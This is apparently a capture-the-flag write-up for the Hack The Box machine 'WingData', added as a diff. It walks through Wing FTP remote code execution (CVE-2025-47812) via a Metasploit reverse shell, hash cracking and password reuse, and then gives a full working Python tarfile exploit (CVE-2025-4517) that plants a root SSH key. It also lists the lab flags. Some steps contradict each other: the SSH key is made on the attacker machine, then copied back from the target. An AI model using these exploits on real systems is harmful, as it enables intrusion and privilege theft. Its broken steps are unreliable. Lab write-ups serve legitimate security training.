@@ -1,0 +1,374 @@
+═══════════════════════════════════════════════════════════════════════════════
+                    WingData HTB - Complete Walkthrough
+═══════════════════════════════════════════════════════════════════════════════
+
+TABLE OF CONTENTS
+─────────────────
+1. Initial Enumeration
+2. Foothold - Wing FTP CVE-2025-47812 (Lua Session Injection)
+3. Password Hash Cracking
+4. User Flag
+5. Privilege Escalation - Python Tarfile CVE-2025-4517
+6. Root Flag
+7. Summary & Mitigations
+
+═══════════════════════════════════════════════════════════════════════════════
+1. INITIAL ENUMERATION
+═══════════════════════════════════════════════════════════════════════════════
+
+1.1 Nmap Scan
+─────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ ┌──(b0y㉿kali)-[~/Documents/HTB/WingData]                                │
+│ └─$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.244.106 | grep '^[0-9]'   │
+│          | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)                    │
+│                                                                           │
+│ ┌──(b0y㉿kali)-[~/Documents/HTB/WingData]                                │
+│ └─$ nmap -p$ports -sC -sV 10.129.244.106                                 │
+│                                                                           │
+│ PORT   STATE SERVICE VERSION                                              │
+│ 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7                      │
+│ 80/tcp open  http    Apache httpd 2.4.66                                 │
+│                                                                           │
+│ Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel  │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+1.2 DNS Configuration
+─────────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ ┌──(b0y㉿kali)-[~/Documents/HTB/WingData]                                │
+│ └─$ echo "10.129.244.106 wingdata.htb" | sudo tee -a /etc/hosts          │
+│                                                                           │
+│ ┌──(b0y㉿kali)-[~/Documents/HTB/WingData]                                │
+│ └─$ echo "10.129.244.106 ftp.wingdata.htb" | sudo tee -a /etc/hosts      │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+1.3 Web Enumeration
+───────────────────
+
+Visiting http://wingdata.htb revealed a Wing FTP Server web client.
+The Client Portal button redirected to http://ftp.wingdata.htb
+Version identified: Wing FTP Server 7.4.3
+
+═══════════════════════════════════════════════════════════════════════════════
+2. FOOTHOLD - WING FTP CVE-2025-47812 (LUA SESSION INJECTION)
+═══════════════════════════════════════════════════════════════════════════════
+
+2.1 Metasploit Exploit
+──────────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ ┌──(b0y㉿kali)-[~/Documents/HTB/WingData]                                │
+│ └─$ msfconsole                                                            │
+│                                                                           │
+│ msf6 > use exploit/multi/http/wingftp_null_byte_rce                      │
+│ msf6 exploit(multi/http/wingftp_null_byte_rce) > set vhost ftp.wingdata.htb│
+│ vhost => ftp.wingdata.htb                                                 │
+│ msf6 exploit(multi/http/wingftp_null_byte_rce) > set rhost 10.129.244.106 │
+│ rhost => 10.129.244.106                                                   │
+│ msf6 exploit(multi/http/wingftp_null_byte_rce) > set lhost 10.10.16.11   │
+│ lhost => 10.10.16.11                                                      │
+│ msf6 exploit(multi/http/wingftp_null_byte_rce) > set USERNAME anonymous   │
+│ USERNAME => anonymous                                                     │
+│ msf6 exploit(multi/http/wingftp_null_byte_rce) > run                      │
+│                                                                           │
+│ [*] Started reverse TCP handler on 10.10.16.11:4444                      │
+│ [+] The target is vulnerable. Detected version 7.4.3 ≤ 7.4.4             │
+│ [+] Received UID: UID=... injection succeeded                            │
+│ [*] Sending stage (3090404 bytes) to 10.129.244.106                      │
+│ [*] Meterpreter session 1 opened (10.10.16.11:4444 -> 10.129.244.106:    │
+│     59564) at 2026-07-09 07:53:11 -0400                                  │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+2.2 Upgrade Shell
+─────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ meterpreter > shell                                                        │
+│ Process 3749 created.                                                      │
+│ Channel 4 created.                                                         │
+│                                                                           │
+│ script /dev/null -c /bin/bash                                             │
+│ Script started, output log file is '/dev/null'.                           │
+│ wingftp@wingdata:/opt/wftpserver$ id                                      │
+│ uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp)                 │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+═══════════════════════════════════════════════════════════════════════════════
+3. PASSWORD HASH CRACKING
+═══════════════════════════════════════════════════════════════════════════════
+
+3.1 Locate User Accounts
+────────────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ wingftp@wingdata:/opt/wftpserver$ cat /etc/passwd | grep bash             │
+│ root:x:0:0:root:/root:/bin/bash                                           │
+│ wingftp:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash        │
+│ wacky:x:1001:1001::/home/wacky:/bin/bash                                 │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+3.2 Find Password Hash
+──────────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ wingftp@wingdata:/opt/wftpserver/Data/1/users$ ls -la                    │
+│ total 28                                                                  │
+│ -rw-rw-rw- 1 wingftp wingftp 2856 Nov 2 12:28 wacky.xml                  │
+│                                                                           │
+│ wingftp@wingdata:/opt/wftpserver/Data/1/users$ cat wacky.xml             │
+│ <?xml version="1.0" ?>                                                    │
+│ <USER_ACCOUNTS Description="Wing FTP Server User Accounts">              │
+│  <USER>                                                                  │
+│   <UserName>wacky</UserName>                                             │
+│   <EnableAccount>1</EnableAccount>                                       │
+│   <EnablePassword>1</EnablePassword>                                     │
+│   <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8   │
+│    a503ca</Password>                                                      │
+│   <ProtocolType>63</ProtocolType>                                        │
+│  </USER>                                                                 │
+│ </USER_ACCOUNTS>                                                         │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+3.3 Crack Hash with John the Ripper
+───────────────────────────────────
+
+Wing FTP Server uses SHA-256 with static salt "WingFTP" (sha256($pass.$salt))
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ ┌──(b0y㉿kali)-[~/Documents/HTB/WingData]                                │
+│ └─$ echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca" > hash.txt │
+│                                                                           │
+│ ┌──(b0y㉿kali)-[~/Documents/HTB/WingData]                                │
+│ └─$ john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt --salt=WingFTP hash.txt │
+│                                                                           │
+│ Password recovered: !#7Blushing^*Bride5                                   │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+Password recovered: !#7Blushing^*Bride5
+
+═══════════════════════════════════════════════════════════════════════════════
+4. USER FLAG
+═══════════════════════════════════════════════════════════════════════════════
+
+SSH login as wacky using the cracked password:
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ ┌──(b0y㉿kali)-[~/Documents/HTB/WingData]                                │
+│ └─$ ssh wacky@10.129.244.106                                              │
+│ wacky@10.129.244.106's password: !#7Blushing^*Bride5                     │
+│                                                                           │
+│ Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1    │
+│                                                                           │
+│ wacky@wingdata:~$ id                                                      │
+│ uid=1001(wacky) gid=1001(wacky) groups=1001(wacky)                       │
+│                                                                           │
+│ wacky@wingdata:~$ cat user.txt                                            │
+│ 5e2c5855322b2b6948c038a383255f67                                          │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+USER FLAG: 5e2c5855322b2b6948c038a383255f67
+
+═══════════════════════════════════════════════════════════════════════════════
+5. PRIVILEGE ESCALATION - PYTHON TARFILE CVE-2025-4517
+═══════════════════════════════════════════════════════════════════════════════
+
+5.1 Check Sudo Privileges
+─────────────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ wacky@wingdata:~$ sudo -l                                                  │
+│ Matching Defaults entries for wacky on wingdata:                          │
+│  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:   │
+│  /usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty                                │
+│                                                                           │
+│ User wacky may run the following commands on wingdata:                    │
+│  (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/            │
+│  restore_backup_clients.py *                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+5.2 Inspect the Script
+──────────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ wacky@wingdata:~$ cat /opt/backup_clients/restore_backup_clients.py      │
+│ #!/usr/bin/env python3                                                    │
+│ import tarfile                                                            │
+│ import os                                                                 │
+│ import sys                                                                │
+│ import re                                                                 │
+│ import argparse                                                           │
+│                                                                           │
+│ BACKUP_BASE_DIR = "/opt/backup_clients/backups"                          │
+│ STAGING_BASE = "/opt/backup_clients/restored_backups"                    │
+│                                                                           │
+│ def main():                                                               │
+│     # ... argument parsing ...                                            │
+│     with tarfile.open(backup_path, "r") as tar:                          │
+│         tar.extractall(path=staging_dir, filter="data")                  │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+5.3 Check Python Version
+────────────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ wacky@wingdata:~$ /usr/local/bin/python3 --version                        │
+│ Python 3.12.3                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+Python 3.12.3 is vulnerable to CVE-2025-4517 (tarfile path traversal bypass)
+
+5.4 Generate SSH Key and Exploit
+────────────────────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ # On Kali - Generate SSH key                                             │
+│ ┌──(b0y㉿kali)-[~]                                                        │
+│ └─$ ssh-keygen -t ed25519 -f ~/.ssh/wingdata_root -C "root@wingdata"    │
+│                                                                           │
+│ # Copy public key to target                                               │
+│ ┌──(b0y㉿kali)-[~]                                                        │
+│ └─$ cat ~/.ssh/wingdata_root.pub                                         │
+│ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMVjD6a2zZJRK9gFZixko8/rHYiCJX...   │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+5.5 Create Malicious Tar Archive
+────────────────────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ wacky@wingdata:~$ cat > /tmp/script.py << 'EOF'                           │
+│ import tarfile, io, sys, os                                               │
+│ pubkey = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMVjD6a2zZJRK9gFZixko8   │
+│          /rHYiCJXAcvHi83GK4IKm1 root@wingdata\n"                          │
+│ comp = 'd' * (55 if sys.platform == 'darwin' else 247)                   │
+│ steps = "abcdefghijklmnop"                                                │
+│ path = ""                                                                 │
+│ with tarfile.open("/tmp/backup_2.tar", "x") as tar:                      │
+│     for i in steps:                                                       │
+│         a = tarfile.TarInfo(os.path.join(path, comp))                    │
+│         a.type = tarfile.DIRTYPE                                          │
+│         tar.addfile(a)                                                    │
+│         b = tarfile.TarInfo(os.path.join(path, i))                       │
+│         b.type = tarfile.SYMTYPE                                          │
+│         b.linkname = comp                                                 │
+│         tar.addfile(b)                                                    │
+│         path = os.path.join(path, comp)                                  │
+│     linkpath = os.path.join("/".join(steps), "l" * 254)                  │
+│     l = tarfile.TarInfo(linkpath)                                         │
+│     l.type = tarfile.SYMTYPE                                              │
+│     l.linkname = "../" * len(steps)                                       │
+│     tar.addfile(l)                                                        │
+│     e = tarfile.TarInfo("escape")                                         │
+│     e.type = tarfile.SYMTYPE                                              │
+│     e.linkname = linkpath + "/../../../../root/.ssh/authorized_keys"     │
+│     tar.addfile(e)                                                        │
+│     f = tarfile.TarInfo("inject")                                         │
+│     f.type = tarfile.LNKTYPE                                              │
+│     f.linkname = "escape"                                                 │
+│     tar.addfile(f)                                                        │
+│     c = tarfile.TarInfo("inject")                                         │
+│     c.type = tarfile.REGTYPE                                              │
+│     c.size = len(pubkey)                                                  │
+│     tar.addfile(c, fileobj=io.BytesIO(pubkey))                           │
+│ print("[+] Created backup_2.tar")                                         │
+│ EOF                                                                       │
+│                                                                           │
+│ wacky@wingdata:~$ python3 /tmp/script.py                                  │
+│ [+] Created backup_2.tar                                                  │
+│                                                                           │
+│ wacky@wingdata:~$ mv /tmp/backup_2.tar /opt/backup_clients/backups/      │
+│                                                                           │
+│ wacky@wingdata:~$ sudo /usr/local/bin/python3                             │
+│ /opt/backup_clients/restore_backup_clients.py -b backup_2.tar            │
+│ --restore-dir restore_1                                                   │
+│                                                                           │
+│ [+] Backup: backup_2.tar                                                  │
+│ [+] Staging directory: /opt/backup_clients/restored_backups/restore_1    │
+│ [+] Extraction completed in /opt/backup_clients/restored_backups/restore_1│
+└─────────────────────────────────────────────────────────────────────────────┘
+
+5.6 Copy Private Key to Kali
+────────────────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ # On target - display private key                                        │
+│ wacky@wingdata:~$ cat ~/.ssh/wingdata_root                                │
+│ -----BEGIN OPENSSH PRIVATE KEY-----                                      │
+│ b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW  │
+│ ...                                                                       │
+│ -----END OPENSSH PRIVATE KEY-----                                        │
+│                                                                           │
+│ # On Kali - copy private key                                             │
+│ ┌──(b0y㉿kali)-[~]                                                        │
+│ └─$ scp wacky@10.129.244.106:~/.ssh/wingdata_root ~/.ssh/                │
+│ wacky@10.129.244.106's password: !#7Blushing^*Bride5                     │
+│                                                                           │
+│ ┌──(b0y㉿kali)-[~]                                                        │
+│ └─$ chmod 600 ~/.ssh/wingdata_root                                       │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+═══════════════════════════════════════════════════════════════════════════════
+6. ROOT FLAG
+═══════════════════════════════════════════════════════════════════════════════
+
+SSH as root using the injected key:
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ ┌──(b0y㉿kali)-[~]                                                        │
+│ └─$ ssh -i ~/.ssh/wingdata_root root@10.129.244.106                      │
+│                                                                           │
+│ Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1    │
+│                                                                           │
+│ root@wingdata:~# id                                                       │
+│ uid=0(root) gid=0(root) groups=0(root)                                   │
+│                                                                           │
+│ root@wingdata:~# ls                                                       │
+│ root.txt                                                                  │
+│                                                                           │
+│ root@wingdata:~# cat root.txt                                             │
+│ 9c91b64beddcf9c4f4ae944252bd4206                                          │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+ROOT FLAG: 9c91b64beddcf9c4f4ae944252bd4206
+
+═══════════════════════════════════════════════════════════════════════════════
+7. SUMMARY
+═══════════════════════════════════════════════════════════════════════════════
+
+Flags Obtained:
+───────────────
+User Flag:  5e2c5855322b2b6948c038a383255f67
+Root Flag:  9c91b64beddcf9c4f4ae944252bd4206
+
+Vulnerabilities Exploited:
+─────────────────────────
+1. CVE-2025-47812 - Wing FTP Server Lua Session Injection (RCE)
+   → Initial access as wingftp
+
+2. Weak Password Storage - SHA-256 with Static Salt
+   → Cracked wacky's password using John the Ripper
+
+3. Password Reuse
+   → Used cracked password for SSH access
+
+4. CVE-2025-4517 - Python Tarfile Path Traversal Bypass
+   → Privilege escalation to root via symlink chain
+
+═══════════════════════════════════════════════════════════════════════════════
+8. MITIGATION RECOMMENDATIONS
+═══════════════════════════════════════════════════════════════════════════════
+
+1. Update Wing FTP Server to latest version (patch CVE-2025-47812)
+2. Use stronger password hashing with unique salts per user
+3. Implement proper password policies (avoid dictionary words)
+4. Update Python to version 3.12.4+ or 3.13.0+ (patch CVE-2025-4517)
+5. Avoid running scripts with root privileges unless absolutely necessary
+6. Validate and sanitize all user-supplied input
+7. Implement proper file extraction security measures
+8. Regular security audits and penetration testing
+
+═══════════════════════════════════════════════════════════════════════════════
+END OF WRITE-UP
+═══════════════════════════════════════════════════════════════════════════════
